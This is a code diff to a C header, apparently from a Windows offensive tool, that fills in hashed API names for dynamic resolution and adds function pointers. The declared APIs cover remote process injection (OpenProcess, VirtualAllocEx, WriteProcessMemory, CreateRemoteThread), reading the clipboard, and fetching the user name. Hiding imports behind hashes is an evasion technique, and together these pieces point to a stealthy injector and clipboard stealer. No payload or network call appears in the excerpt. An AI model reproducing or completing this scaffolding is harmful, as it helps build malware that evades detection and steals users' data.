@@ -63,20 +63,21 @@ typedef struct _MY_LDR_DATA_TABLE_ENTRY {
 #define HASH_FormatMessageA             0x3F75A588U
 #define HASH_GetStdHandle               0xe3b9876aU
 #define HASH_WriteFile                  0x7f07c44aU
-#define HASH_Sleep                      0x2fa62ca8U // À REMPLIR
-#define HASH_WaitForSingleObject        0x71948ca4U // À REMPLIR
-#define HASH_DisableThreadLibraryCalls  0x01c59c83U // À REMPLIR
+#define HASH_Sleep                      0x2fa62ca8U
+#define HASH_WaitForSingleObject        0x71948ca4U
+#define HASH_DisableThreadLibraryCalls  0x01c59c83U
+#define HASH_GlobalLock                 0x2ac84289U
+#define HASH_GlobalUnlock               0xbf7687caU
+#define HASH_GetCurrentProcess          0x6dd8a845U
 
 /* USER32 */
-#define HASH_GetClipboardSequenceNumber 0xae01ce93U // À REMPLIR
-#define HASH_OpenClipboard              0x8beb9585U // À REMPLIR
-#define HASH_GetClipboardData           0x849d10e7U // À REMPLIR
-#define HASH_CloseClipboard             0xdd5fcc0bU // À REMPLIR
-#define HASH_GlobalLock                 0x2ac84289U // À REMPLIR
-#define HASH_GlobalUnlock               0xbf7687caU // À REMPLIR
+#define HASH_GetClipboardSequenceNumber 0xae01ce93U
+#define HASH_OpenClipboard              0x8beb9585U
+#define HASH_GetClipboardData           0x849d10e7U
+#define HASH_CloseClipboard             0xdd5fcc0bU
 
 /* ADVAPI32 */
-#define HASH_GetUserNameA               0x38a7c61aU // À REMPLIR
+#define HASH_GetUserNameA               0x38a7c61aU
 
 /* ============================================================================
  * Hash Functions
@@ -114,6 +115,7 @@ typedef BOOL   (WINAPI *fnWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumb
 typedef VOID   (WINAPI *fnSleep)(DWORD dwMilliseconds);
 typedef DWORD  (WINAPI *fnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
 typedef BOOL   (WINAPI *fnDisableThreadLibraryCalls)(HMODULE hLibModule);
+typedef HANDLE (WINAPI *fnGetCurrentProcess)();
 
 /* USER32 */
 typedef DWORD  (WINAPI *fnGetClipboardSequenceNumber)(void);
@@ -132,31 +134,32 @@ typedef BOOL   (WINAPI *fnGetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
 
 typedef struct _DYNAMIC_APIS {
     /* KERNEL32 */
-    fnOpenProcess               pOpenProcess;
-    fnVirtualAllocEx            pVirtualAllocEx;
-    fnVirtualProtect            pVirtualProtect;
-    fnWriteProcessMemory        pWriteProcessMemory;
-    fnCreateRemoteThread        pCreateRemoteThread;
-    fnVirtualFreeEx             pVirtualFreeEx;
-    fnCloseHandle               pCloseHandle;
-    fnGetStdHandle              pGetStdHandle;
-    fnWriteFile                 pWriteFile;
-    fnCreateToolhelp32Snapshot  pCreateToolhelp32Snapshot;
-    fnProcess32First            pProcess32First;
-    fnProcess32Next             pProcess32Next;
-    fnGetLastError              pGetLastError;
-    fnFormatMessageA            pFormatMessageA;
-    fnSleep                     pSleep;
-    fnWaitForSingleObject       pWaitForSingleObject;
-    fnDisableThreadLibraryCalls pDisableThreadLibraryCalls;
+    fnOpenProcess                pOpenProcess;
+    fnVirtualAllocEx             pVirtualAllocEx;
+    fnVirtualProtect             pVirtualProtect;
+    fnWriteProcessMemory         pWriteProcessMemory;
+    fnCreateRemoteThread         pCreateRemoteThread;
+    fnVirtualFreeEx              pVirtualFreeEx;
+    fnCloseHandle                pCloseHandle;
+    fnGetStdHandle               pGetStdHandle;
+    fnWriteFile                  pWriteFile;
+    fnCreateToolhelp32Snapshot   pCreateToolhelp32Snapshot;
+    fnProcess32First             pProcess32First;
+    fnProcess32Next              pProcess32Next;
+    fnGetLastError               pGetLastError;
+    fnFormatMessageA             pFormatMessageA;
+    fnSleep                      pSleep;
+    fnWaitForSingleObject        pWaitForSingleObject;
+    fnDisableThreadLibraryCalls  pDisableThreadLibraryCalls;
+    fnGlobalLock                 pGlobalLock;
+    fnGlobalUnlock               pGlobalUnlock;
+    fnGetCurrentProcess          pGetCurrentProcess;
 
     /* USER32 */
     fnGetClipboardSequenceNumber pGetClipboardSequenceNumber;
     fnOpenClipboard              pOpenClipboard;
     fnGetClipboardData           pGetClipboardData;
     fnCloseClipboard             pCloseClipboard;
-    fnGlobalLock                 pGlobalLock;
-    fnGlobalUnlock               pGlobalUnlock;
 
     /* ADVAPI32 */
     fnGetUserNameA               pGetUserNameA;
